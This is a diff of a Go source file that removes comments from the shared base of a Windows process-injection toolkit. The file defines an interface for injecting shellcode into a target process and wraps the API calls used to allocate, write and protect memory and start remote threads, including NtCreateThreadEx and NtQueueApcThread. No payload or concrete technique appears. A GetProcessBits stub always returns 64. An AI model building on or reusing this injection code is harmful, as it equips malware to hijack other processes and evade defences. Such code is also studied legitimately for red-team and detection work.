@@ -7,20 +7,19 @@ import (
 	"unsafe"
 )
 
-// Common Windows constants and types needed for process injection
 const (
-	// Memory allocation types
+	
 	MEM_COMMIT             = 0x00001000
 	MEM_RESERVE            = 0x00002000
 	MEM_RELEASE            = 0x00008000
 	
-	// Memory protection constants
+	
 	PAGE_EXECUTE           = 0x10
 	PAGE_EXECUTE_READ      = 0x20
 	PAGE_EXECUTE_READWRITE = 0x40
 	PAGE_READWRITE         = 0x04
 	
-	// Process access rights
+	
 	PROCESS_ALL_ACCESS     = 0x1F0FFF
 	PROCESS_CREATE_THREAD  = 0x0002
 	PROCESS_VM_OPERATION   = 0x0008
@@ -28,14 +27,13 @@ const (
 	PROCESS_VM_WRITE       = 0x0020
 	PROCESS_QUERY_INFORMATION = 0x0400
 	
-	// Thread creation flags
+	
 	CREATE_SUSPENDED       = 0x00000004
 	
-	// Wait constants
+	
 	INFINITE               = 0xFFFFFFFF
 )
 
-// Windows API function types
 type (
 	HANDLE uintptr
 	DWORD  uint32
@@ -43,40 +41,35 @@ type (
 	SIZE_T uintptr
 )
 
-// Injector is the base interface for all injection techniques
 type Injector interface {
-	// Inject injects shellcode into a target process
+	
 	Inject(pid int, shellcode []byte) error
 	
-	// Name returns the name of the injection technique
+	
 	Name() string
 	
-	// Description returns a description of the injection technique
+	
 	Description() string
 }
 
-// BaseInjector contains common functionality for all injectors
 type BaseInjector struct {
 	name        string
 	description string
 }
 
-// Name returns the name of the injection technique
 func (b *BaseInjector) Name() string {
 	return b.name
 }
 
-// Description returns a description of the injection technique
 func (b *BaseInjector) Description() string {
 	return b.description
 }
 
-// Common Windows API functions used by injectors
 var (
 	kernel32 = syscall.NewLazyDLL("kernel32.dll")
 	ntdll    = syscall.NewLazyDLL("ntdll.dll")
 	
-	// Process and thread functions
+	
 	openProcess            = kernel32.NewProc("OpenProcess")
 	createRemoteThread     = kernel32.NewProc("CreateRemoteThread")
 	waitForSingleObject    = kernel32.NewProc("WaitForSingleObject")
@@ -88,20 +81,19 @@ var (
 	getThreadContext       = kernel32.NewProc("GetThreadContext")
 	setThreadContext       = kernel32.NewProc("SetThreadContext")
 	
-	// Memory functions
+	
 	virtualAllocEx         = kernel32.NewProc("VirtualAllocEx")
 	virtualFreeEx          = kernel32.NewProc("VirtualFreeEx")
 	writeProcessMemory     = kernel32.NewProc("WriteProcessMemory")
 	readProcessMemory      = kernel32.NewProc("ReadProcessMemory")
 	virtualProtectEx       = kernel32.NewProc("VirtualProtectEx")
 	
-	// NT API functions
+	
 	ntCreateThreadEx       = ntdll.NewProc("NtCreateThreadEx")
 	rtlCreateUserThread    = ntdll.NewProc("RtlCreateUserThread")
 	ntQueueApcThread       = ntdll.NewProc("NtQueueApcThread")
 )
 
-// OpenProcess opens a handle to a process
 func OpenProcess(desiredAccess DWORD, inheritHandle bool, processId DWORD) (HANDLE, error) {
 	inherit := 0
 	if inheritHandle {
@@ -121,7 +113,6 @@ func OpenProcess(desiredAccess DWORD, inheritHandle bool, processId DWORD) (HAND
 	return HANDLE(handle), nil
 }
 
-// VirtualAllocEx allocates memory in a remote process
 func VirtualAllocEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flAllocationType DWORD, flProtect DWORD) (LPVOID, error) {
 	addr, _, err := virtualAllocEx.Call(
 		uintptr(hProcess),
@@ -138,7 +129,6 @@ func VirtualAllocEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flAllocati
 	return LPVOID(addr), nil
 }
 
-// WriteProcessMemory writes data to a remote process
 func WriteProcessMemory(hProcess HANDLE, lpBaseAddress LPVOID, lpBuffer []byte, nSize SIZE_T) error {
 	var bytesWritten uintptr
 	
@@ -161,7 +151,6 @@ func WriteProcessMemory(hProcess HANDLE, lpBaseAddress LPVOID, lpBuffer []byte, 
 	return nil
 }
 
-// VirtualProtectEx changes the protection of a memory region in a remote process
 func VirtualProtectEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flNewProtect DWORD) (DWORD, error) {
 	var oldProtect DWORD
 	
@@ -180,7 +169,6 @@ func VirtualProtectEx(hProcess HANDLE, lpAddress LPVOID, dwSize SIZE_T, flNewPro
 	return oldProtect, nil
 }
 
-// CreateRemoteThread creates a thread in a remote process
 func CreateRemoteThread(hProcess HANDLE, lpThreadAttributes LPVOID, dwStackSize SIZE_T, 
 	lpStartAddress LPVOID, lpParameter LPVOID, dwCreationFlags DWORD) (HANDLE, error) {
 	
@@ -203,7 +191,6 @@ func CreateRemoteThread(hProcess HANDLE, lpThreadAttributes LPVOID, dwStackSize 
 	return HANDLE(handle), nil
 }
 
-// CloseHandle closes a handle
 func CloseHandle(hObject HANDLE) error {
 	result, _, err := closeHandle.Call(uintptr(hObject))
 	
@@ -214,7 +201,6 @@ func CloseHandle(hObject HANDLE) error {
 	return nil
 }
 
-// WaitForSingleObject waits for an object to be signaled
 func WaitForSingleObject(hHandle HANDLE, dwMilliseconds DWORD) DWORD {
 	result, _, _ := waitForSingleObject.Call(
 		uintptr(hHandle),
@@ -224,7 +210,6 @@ func WaitForSingleObject(hHandle HANDLE, dwMilliseconds DWORD) DWORD {
 	return DWORD(result)
 }
 
-// GetExitCodeThread gets the exit code of a thread
 func GetExitCodeThread(hThread HANDLE) (DWORD, error) {
 	var exitCode DWORD
 	
@@ -240,7 +225,6 @@ func GetExitCodeThread(hThread HANDLE) (DWORD, error) {
 	return exitCode, nil
 }
 
-// IsProcessRunning checks if a process is running
 func IsProcessRunning(pid int) bool {
 	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, DWORD(pid))
 	if err != nil {
@@ -251,7 +235,6 @@ func IsProcessRunning(pid int) bool {
 	return true
 }
 
-// ValidateShellcode performs basic validation on shellcode
 func ValidateShellcode(shellcode []byte) error {
 	if len(shellcode) == 0 {
 		return errors.New("shellcode is empty")
@@ -264,10 +247,9 @@ func ValidateShellcode(shellcode []byte) error {
 	return nil
 }
 
-// GetProcessBits determines if a process is 32-bit or 64-bit
 func GetProcessBits(pid int) (int, error) {
-	// This is a simplified implementation
-	// In a real implementation, you would use IsWow64Process
-	// For now, we'll assume 64-bit
+	
+	
+	
 	return 64, nil
 }
